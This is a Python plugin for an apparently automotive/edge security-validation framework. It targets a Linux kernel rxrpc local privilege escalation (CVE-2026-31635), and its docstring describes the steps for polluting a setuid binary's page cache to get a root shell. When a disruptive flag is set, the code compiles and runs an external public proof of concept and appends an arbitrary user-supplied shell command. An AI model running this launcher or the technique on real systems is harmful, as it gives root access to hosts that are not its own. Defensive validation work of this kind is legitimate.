#!/usr/bin/env python3
"""CVE-2026-31635 – DirtyCBC/DirtyDecrypt: rxgk_verify_response() auth_len inverted boundary check allows rxgk_decrypt_skb() to corrupt page cache without COW guard.

Public PoC source: https://github.com/v12-security/pocs/tree/main/dirtydecrypt
  Mirror: https://github.com/aexdyhaxor/DirtyDecrypt
  Files: ['poc.c']
  Technique:
    1. Create user/net namespace; fake AF_RXRPC loopback UDP server.
    2. Construct rxgk token; send oversized auth_len packet (inverted check lets it pass).
    3. rxgk_decrypt_skb() performs in-place decryption without COW → pollutes page cache
       of any spliced read-only file (e.g. /usr/bin/su).
    4. Execute /usr/bin/su with polluted page cache → root shell.

Reference: https://nvd.nist.gov/vuln/detail/CVE-2026-31635
"""
from __future__ import annotations

import re
import subprocess
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 50,
    "cve": "CVE-2026-31635",
    "year": 2026,
    "domain": "advanced",
    "vendor_product": "Linux kernel 6.16.1–7.0 (IVI/边缘 Linux 节点)",
    "component": "Linux kernel net/rxrpc/rxgk.c – rxgk_verify_response() + rxgk_decrypt_skb()",
    "type": "本地权限提升 (LPE) → root / Page Cache 污染",
    "summary": (
        "DirtyCBC/DirtyDecrypt: rxgk_verify_response() 对 auth_len 的边界检查写反，"
        "超大认证器长度被放通后进入 rxgk_decrypt_skb()，该函数缺少 COW 保护直接原地解密，"
        "通过 splice() 把 setuid 二进制 page cache 引入解密流，最终污染页缓存并触发 root shell。"
        "影响内核 6.16.1–7.0-rc7。"
    ),
    "source_url": "https://github.com/v12-security/pocs/tree/main/dirtydecrypt",
    "requires_manual_review": True,
    "affected": [
        {
            "vendor": "Linux",
            "product": "Linux kernel",
            "versions": [
                {"version": "6.16.1", "status": "affected", "lessThan": "6.18.23"},
                {"version": "6.19", "status": "affected", "lessThan": "6.19.13"},
                {"version": "7.0-rc1", "status": "affected", "lessThan": "7.0"},
            ],
        }
    ],
}

POC_REPO = (
    Path(__file__).parent.parent.parent
    / "public_poc_sources/repos/v12-security__pocs/dirtydecrypt"
)
POC_REPO_ALT = (
    Path(__file__).parent.parent.parent
    / "public_poc_sources/repos/aexdyhaxor__DirtyDecrypt"
)


def _check_version() -> dict:
    result: dict = {}
    try:
        r = subprocess.run(["uname", "-r"], capture_output=True, text=True, timeout=5)
        kver = r.stdout.strip()
        result["kernel_version"] = kver

        m = re.match(r"(\d+)\.(\d+)(?:\.(\d+))?", kver)
        if m:
            major, minor, patch = int(m.group(1)), int(m.group(2)), int(m.group(3) or 0)
            vuln = False
            if major == 6:
                if (minor == 16 and patch >= 1) or minor == 17:
                    vuln = True
                elif minor == 18 and patch < 23:
                    vuln = True
                elif minor == 19 and patch < 13:
                    vuln = True
            elif major == 7:
                vuln = True  # rc variants
            result["version_in_affected_range"] = vuln

        # Check AF_RXRPC availability
        rxrpc = Path("/proc/net/rxrpc")
        result["rxrpc_available"] = rxrpc.exists()

        # Check user namespace support
        userns = Path("/proc/sys/user/max_user_namespaces")
        result["user_namespace_max"] = userns.read_text().strip() if userns.exists() else "unknown"

    except Exception as exc:
        result["check_error"] = str(exc)
    return result


def _compile_and_run(allow_disruptive: bool, lab_cmd: str) -> dict:
    result: dict = {}

    # Locate poc.c
    poc_c = POC_REPO / "poc.c"
    if not poc_c.exists():
        poc_c = POC_REPO_ALT / "poc.c"
    if not poc_c.exists():
        result["poc_repo_missing"] = str(POC_REPO)
        result["detail"] = (
            "Clone https://github.com/v12-security/pocs into "
            "public_poc_sources/repos/v12-security__pocs to enable compilation. "
            "PoC command: gcc -O2 -Wall -o poc poc.c && ./poc"
        )
        result["would_compile"] = "gcc -O2 -Wall -o poc poc.c"
        result["would_run"] = "./poc"
        return result

    if not allow_disruptive:
        result["would_compile"] = "gcc -O2 -Wall -o poc poc.c"
        result["would_run"] = "./poc"
        result["detail"] = (
            "Set allow_disruptive=true to compile and run DirtyDecrypt PoC. "
            "WARNING: Pollutes setuid binary page cache → root shell. "
            "Run only in isolated test VM."
        )
        return result

    with tempfile.TemporaryDirectory() as tmpdir:
        import shutil
        shutil.copy2(str(poc_c), f"{tmpdir}/poc.c")
        r = subprocess.run(
            "gcc -O2 -Wall -o poc poc.c",
            shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=60,
        )
        result["compile_rc"] = r.returncode
        result["compile_out"] = (r.stdout + r.stderr)[:400]
        if r.returncode != 0:
            result["detail"] = "Compile failed – check kernel headers / gcc."
            return result

        r2 = subprocess.run(
            f"./poc; {lab_cmd}",
            shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=120,
        )
        result["run_rc"] = r2.returncode
        result["run_out"] = (r2.stdout + r2.stderr)[:600]
        result["exploited"] = (
            "uid=0" in r2.stdout
            or "root" in r2.stdout.lower()
            or "# " in r2.stdout
        )
    return result


def _run_poc(plugin) -> dict:
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    lab_cmd = (plugin.params or {}).get("lab_command", "id")

    evidence: dict = {
        "cve": "CVE-2026-31635",
        "poc_repo": str(POC_REPO),
        "poc_repo_present": (POC_REPO / "poc.c").exists() or (POC_REPO_ALT / "poc.c").exists(),
        "exploit_files": ["poc.c"],
        "technique": (
            "rxgk_verify_response() auth_len inverted check → oversized authenticator passes → "
            "rxgk_decrypt_skb() in-place decrypt without COW → splice(/usr/bin/su page cache) → "
            "page cache poisoned with root-shell ELF → execve(/usr/bin/su) → uid=0."
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-31635",
    }

    ver = _check_version()
    evidence.update(ver)
    exploit = _compile_and_run(allow_disruptive, lab_cmd)
    evidence.update(exploit)

    return {
        "vulnerable": evidence.get("exploited"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "https://github.com/v12-security/pocs/tree/main/dirtydecrypt",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc50CVE202631635DirtyCBCDirtyDecryptLpeAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-ADV-050"
    meta_poc_name = 'CVE-2026-31635 Auth Length Check Bypass LPE Active Validation'
    meta_cve_id = "CVE-2026-31635"
    meta_severity = "High"
    meta_protocol = "local"
    meta_target_os = ["linux"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive", "lab_command"]
    meta_profiles = ["advanced", "kernel", "pagecache"]
    meta_source_url = "https://github.com/v12-security/pocs/tree/main/dirtydecrypt"
    meta_references       = ['https://github.com/v12-security/pocs/tree/main/dirtydecrypt']
    meta_attack_surface = (
        "本地用户通过 AF_RXRPC + rxgk 解密路径污染 setuid 二进制 page cache → root"
    )
    is_disruptive = True
    meta_destructive_level = "RootCompromise"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "50_Linux_Kernel_DirtyCBC_DirtyDecrypt_LPE_Audit") if "VULN" in dir() else "50_Linux_Kernel_DirtyCBC_DirtyDecrypt_LPE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc50CVE202631635DirtyCBCDirtyDecryptLpeAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
